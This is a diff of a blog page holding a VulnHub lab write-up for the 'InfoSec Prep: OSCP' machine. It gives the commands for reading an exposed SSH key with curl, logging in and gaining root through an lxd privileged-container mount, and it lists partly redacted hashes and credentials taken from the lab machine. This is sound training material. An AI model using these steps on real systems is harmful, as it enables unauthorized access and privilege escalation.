@@ -31,19 +31,19 @@
       </table>
     </div>
     <div class="body">
-          <h1>[VulnHub] InfoSec Prep: OSCP</h1>
+          <h1 class="h1 collapsible" onclick="toggle(this);">[VulnHub] InfoSec Prep: OSCP</h1>
                   <p><a href="/posts/20200730_thm-yotf.html"> « </a>📅 published on <code>10/Aug/2020</code><a href="/posts/20201124_htb-buff.html"> » </a></p>
-                <h2>Overview</h2>
-<p>This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/infosec-prep-oscp,508/">InfoSec Prep: OSCP</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
-<p><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_infosecpreposcp/machinescli.png.webp" /></p>
-<h3>Killchain</h3>
-<p>Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
-<p><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_infosecpreposcp/killchain.png.webp" /></p>
-<h3>TTPs</h3>
-<p>1. <code>80/tcp/http/Apache httpd 2.4.41 ((Ubuntu))</code>: <a href="https://github.com/7h3rAm/writeups#enumerate_proto_http">enumerate_proto_http</a>, <a href="https://github.com/7h3rAm/writeups#exploit_ssh_privatekeys">exploit_ssh_privatekeys</a>, <a href="https://github.com/7h3rAm/writeups#privesc_lxc_bash">privesc_lxc_bash</a>  </p>
-<h2>Phase #1: Enumeration</h2>
-<p>1. Here's the Nmap scan result:  </p>
-<pre><code># Nmap 7.80 scan initiated Mon Jul 20 12:03:57 2020 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /home/kali/toolbox/repos/writeupsall/vulnhub.infosecpreposcp/192.168.119.198/scans/_quick_tcp_nmap.txt -oX /home/kali/toolbox/repos/writeupsall/vulnhub.infosecpreposcp/192.168.119.198/scans/xml/_quick_tcp_nmap.xml 192.168.119.198
+                <h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
+<p class="nested">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/infosec-prep-oscp,508/">InfoSec Prep: OSCP</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
+<p class="nested"><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_infosecpreposcp/machinescli.png.webp" /></p>
+<h3 class="h3 collapsible" onclick="toggle(this);">Killchain</h3>
+<p class="nested">Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
+<p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_infosecpreposcp/killchain.png.webp" /></p>
+<h3 class="h3 collapsible" onclick="toggle(this);">TTPs</h3>
+<p class="nested">1. <code>80/tcp/http/Apache httpd 2.4.41 ((Ubuntu))</code>: <a href="https://github.com/7h3rAm/writeups#enumerate_proto_http">enumerate_proto_http</a>, <a href="https://github.com/7h3rAm/writeups#exploit_ssh_privatekeys">exploit_ssh_privatekeys</a>, <a href="https://github.com/7h3rAm/writeups#privesc_lxc_bash">privesc_lxc_bash</a>  </p>
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
+<p class="nested">1. Here's the Nmap scan result:  </p>
+<pre class="nested"><code># Nmap 7.80 scan initiated Mon Jul 20 12:03:57 2020 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /home/kali/toolbox/repos/writeupsall/vulnhub.infosecpreposcp/192.168.119.198/scans/_quick_tcp_nmap.txt -oX /home/kali/toolbox/repos/writeupsall/vulnhub.infosecpreposcp/192.168.119.198/scans/xml/_quick_tcp_nmap.xml 192.168.119.198
 Nmap scan report for 192.168.119.198
 Host is up, received user-set (0.0022s latency).
 Scanned at 2020-07-20 12:04:12 IST for 9s
@@ -66,42 +66,42 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Mon Jul 20 12:04:21 2020 -- 1 IP address (1 host up) scanned in 24.59 seconds
 
 </code></pre>
-<p>2. Here's the summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:  </p>
-<p><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_vulnhub_infosecpreposcp/openports.png.webp" />  </p>
-<p>3. We find <code>80/tcp</code> to be open. Upon browsing the webpage we see that it looks to be a Wordpress blog with a post named "OSCP Voucher". This posts lists the process to submit the flag and also mentions that there's a user named <code>oscp</code> on this machine:  </p>
-<p><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot01.png.webp" />  </p>
-<p>4. The <code>gobuster</code> scan result confirms that this is a Wordpress blog. We see an interesting entry <code>secret.txt</code> from <code>gobuster</code> scan results and also from the <code>robots.txt</code> file:  </p>
-<p><img alt="writeup.enumeration.steps.4.1" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot02.png.webp" />  </p>
-<p><img alt="writeup.enumeration.steps.4.2" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot03.png.webp" />  </p>
-<p>5. This file has base64 encoded content that we decode to find a SSH private key file:  </p>
-<pre><code>curl http://192.168.119.198/secret.txt | base64 -d -
+<p class="nested">2. Here's the summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:  </p>
+<p class="nested"><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_vulnhub_infosecpreposcp/openports.png.webp" />  </p>
+<p class="nested">3. We find <code>80/tcp</code> to be open. Upon browsing the webpage we see that it looks to be a Wordpress blog with a post named "OSCP Voucher". This posts lists the process to submit the flag and also mentions that there's a user named <code>oscp</code> on this machine:  </p>
+<p class="nested"><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot01.png.webp" />  </p>
+<p class="nested">4. The <code>gobuster</code> scan result confirms that this is a Wordpress blog. We see an interesting entry <code>secret.txt</code> from <code>gobuster</code> scan results and also from the <code>robots.txt</code> file:  </p>
+<p class="nested"><img alt="writeup.enumeration.steps.4.1" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot02.png.webp" />  </p>
+<p class="nested"><img alt="writeup.enumeration.steps.4.2" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot03.png.webp" />  </p>
+<p class="nested">5. This file has base64 encoded content that we decode to find a SSH private key file:  </p>
+<pre class="nested"><code>curl http://192.168.119.198/secret.txt | base64 -d -
 </code></pre>
-<p><img alt="writeup.enumeration.steps.5.1" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot04.png.webp" />  </p>
-<h3>Findings</h3>
-<h4>Open Ports</h4>
-<pre><code>22/tcp      ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux protocol 2.0)
+<p class="nested"><img alt="writeup.enumeration.steps.5.1" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot04.png.webp" />  </p>
+<h3 class="h3 collapsible" onclick="toggle(this);">Findings</h3>
+<h4 class="h4 collapsible" onclick="toggle(this);">Open Ports</h4>
+<pre class="nested"><code>22/tcp      ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux protocol 2.0)
 80/tcp      http       Apache httpd 2.4.41 ((Ubuntu))
 33060/tcp   socks5
 </code></pre>
-<h4>Files</h4>
-<pre><code>http://192.168.119.198/secret.txt
+<h4 class="h4 collapsible" onclick="toggle(this);">Files</h4>
+<pre class="nested"><code>http://192.168.119.198/secret.txt
 http://192.168.119.198/license.txt
 </code></pre>
-<h4>Users</h4>
-<pre><code>ssh: oscp
+<h4 class="h4 collapsible" onclick="toggle(this);">Users</h4>
+<pre class="nested"><code>ssh: oscp
 wordpress: admin
 </code></pre>
-<h2>Phase #2: Exploitation</h2>
-<p>1. We can try to SSH into the machine as user <code>oscp</code> using the SSH private key file. First, we need to set right permissions to the key file and then use it for login:  </p>
-<pre><code>curl http://192.168.119.198/secret.txt | base64 -d - &gt;./sshkey.pvt
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
+<p class="nested">1. We can try to SSH into the machine as user <code>oscp</code> using the SSH private key file. First, we need to set right permissions to the key file and then use it for login:  </p>
+<pre class="nested"><code>curl http://192.168.119.198/secret.txt | base64 -d - &gt;./sshkey.pvt
 chmod 600 sshkey.pvt
 ssh -i sshkey.pvt oscp@192.168.119.198
 </code></pre>
-<p><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot05.png.webp" />  </p>
-<p>2. We successfully login and get interactive access of the machine as user <code>oscp</code>:  </p>
-<p><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot06.png.webp" />  </p>
-<h2>Phase #2.5: Post Exploitation</h2>
-<pre><code>oscp@oscp&gt; id
+<p class="nested"><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot05.png.webp" />  </p>
+<p class="nested">2. We successfully login and get interactive access of the machine as user <code>oscp</code>:  </p>
+<p class="nested"><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot06.png.webp" />  </p>
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
+<pre class="nested"><code>oscp@oscp&gt; id
 uid=1000(oscp) gid=1000(oscp) groups=1000(oscp),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
 oscp@oscp&gt;  
 oscp@oscp&gt; uname
@@ -130,42 +130,42 @@ oscp@oscp&gt; users
 root
 oscp
 </code></pre>
-<h2>Phase #3: Privilege Escalation</h2>
-<p>1. From the output of command <code>id</code>, we see that the user <code>oscp</code> is a member of <code>lxd</code> group. We can exploit this misconfiguration to create a dummy container that mounts the local file system and gain access to all privileged files. But we see that the <code>lxc</code> command for this to work is not found in our current environment path:  </p>
-<pre><code>lxc init ubuntu:16.04 test -c security.privileged=true
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
+<p class="nested">1. From the output of command <code>id</code>, we see that the user <code>oscp</code> is a member of <code>lxd</code> group. We can exploit this misconfiguration to create a dummy container that mounts the local file system and gain access to all privileged files. But we see that the <code>lxc</code> command for this to work is not found in our current environment path:  </p>
+<pre class="nested"><code>lxc init ubuntu:16.04 test -c security.privileged=true
   -bash: lxc: command not found
 </code></pre>
-<p><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot09.png.webp" />  </p>
-<p>2. We locate the file and use it's absolute path to create the container. This time we see another error about storage pool. The error message helpfully points us in the right direction and we need to initialize LXD first. We use the suggested command with the absolute path and choose default settings when prompted for a change:  </p>
-<pre><code>/snap/bin/lxd init
+<p class="nested"><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot09.png.webp" />  </p>
+<p class="nested">2. We locate the file and use it's absolute path to create the container. This time we see another error about storage pool. The error message helpfully points us in the right direction and we need to initialize LXD first. We use the suggested command with the absolute path and choose default settings when prompted for a change:  </p>
+<pre class="nested"><code>/snap/bin/lxd init
 /snap/bin/lxc init ubuntu:16.04 test -c security.privileged=true
 /snap/bin/lxc config device add test whatever disk source=/ path=/mnt/root recursive=true 
 /snap/bin/lxc start test
 /snap/bin/lxc exec test bash
 </code></pre>
-<p><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot10.png.webp" />  </p>
-<p><img alt="writeup.privesc.steps.2.2" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot11.png.webp" />  </p>
-<p><img alt="writeup.privesc.steps.2.3" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot12.png.webp" />  </p>
-<p><img alt="writeup.privesc.steps.2.4" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot13.png.webp" />  </p>
-<h2>Learning/Recommendation</h2>
-<ul>
+<p class="nested"><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot10.png.webp" />  </p>
+<p class="nested"><img alt="writeup.privesc.steps.2.2" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot11.png.webp" />  </p>
+<p class="nested"><img alt="writeup.privesc.steps.2.3" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot12.png.webp" />  </p>
+<p class="nested"><img alt="writeup.privesc.steps.2.4" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot13.png.webp" />  </p>
+<h2 class="h2 collapsible" onclick="toggle(this);">Learning/Recommendation</h2>
+<ul class="nested">
 <li>The SSH key for a user on the target machine was exposed via web application. Although the file was base64 encoded and listed within <code>robots.txt</code>, it doesn't stop an attacker from accessing it.</li>
 <li>The local user was member of the LXD group which allowed to create a privileged container with access to the entire file system. This lead to complete access of files, even those that have been restricted to <code>root</code> user only.</li>
 </ul>
-<h2>Loot</h2>
-<h3>Hashes</h3>
-<pre><code>oscp:$6$k8OEgwaFdUqpVETQ$sKlBojI3IYunw8wEDAyoFdHgVtOPzkDPqksql7IWzpfZXpd3UqP569BokTZ52mDroq/rmJY9zgfeQVmB.........................
+<h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
+<h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
+<pre class="nested"><code>oscp:$6$k8OEgwaFdUqpVETQ$sKlBojI3IYunw8wEDAyoFdHgVtOPzkDPqksql7IWzpfZXpd3UqP569BokTZ52mDroq/rmJY9zgfeQVmB.........................
 root:$6$.wvqHr9ixq/hDW8t$a/dHKimULfr5rJTDlS7uoUanuJB2YUUkh.LWSKF7kTNp4aL8UTlOk2wT8IkAgJ.vDF/ThSIOegsuclEg.........................
 </code></pre>
-<h3>Credentials</h3>
-<pre><code>mysql: wordpress/Oscp12....
+<h3 class="h3 collapsible" onclick="toggle(this);">Credentials</h3>
+<pre class="nested"><code>mysql: wordpress/Oscp12....
 wordpress: admin:$P$Bx9ohXoCVR5lkKtuQbuWuh2........
 </code></pre>
-<h3>Flags</h3>
-<pre><code>/mnt/root/root/flag.txt: d73b04b0e696b0945283d...........
+<h3 class="h3 collapsible" onclick="toggle(this);">Flags</h3>
+<pre class="nested"><code>/mnt/root/root/flag.txt: d73b04b0e696b0945283d...........
 </code></pre>
-<h2>References</h2>
-<ul>
+<h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
+<ul class="nested">
 <li><a href="https://www.vulnhub.com/entry/infosec-prep-oscp,508/">https://www.vulnhub.com/entry/infosec-prep-oscp,508/</a>  </li>
 <li><a href="https://reboare.github.io/lxd/lxd-escape.html">https://reboare.github.io/lxd/lxd-escape.html</a>  </li>
 <li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/lxd-privilege-escalation">https://book.hacktricks.xyz/linux-unix/privilege-escalation/lxd-privilege-escalation</a>  </li>
@@ -176,19 +176,12 @@ wordpress: admin:$P$Bx9ohXoCVR5lkKtuQbuWuh2........
             </div>
     <div class="footer footercenter">
       <span>
-        <a href=https://creativecommons.org/licenses/by-sa/4.0/ class=footspan>  </a>
+        <a href="https://github.com/7h3rAm/7h3rAm.github.io" class="footspan">  </a>
       </span>
     </div>
     <script>hljs.initHighlightingOnLoad();</script>
     <script>hljs.initLineNumbersOnLoad();</script>
-    <script>
-      function toggle(s){
-        s.classList.toggle("expanded");
-        for(var l=s.nextElementSibling;l;){
-          l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling
-        }
-      }
-    </script>
+    <script>function toggle(s){s.classList.toggle("expanded");var t=!1,i=!1,a=!1;s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0),console.log(s),console.log(t),console.log(i),console.log(a);for(var l=s.nextElementSibling;l;){if(t&&l.classList.contains("h2")){l.classList.toggle("active");break}if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){l.classList.toggle("active");break}if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){l.classList.toggle("active");break}l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling}}</script>
     <script data-goatcounter=https://manthan.goatcounter.com/count async src=//gc.zgo.at/count.js></script>
   </body>
 </html>
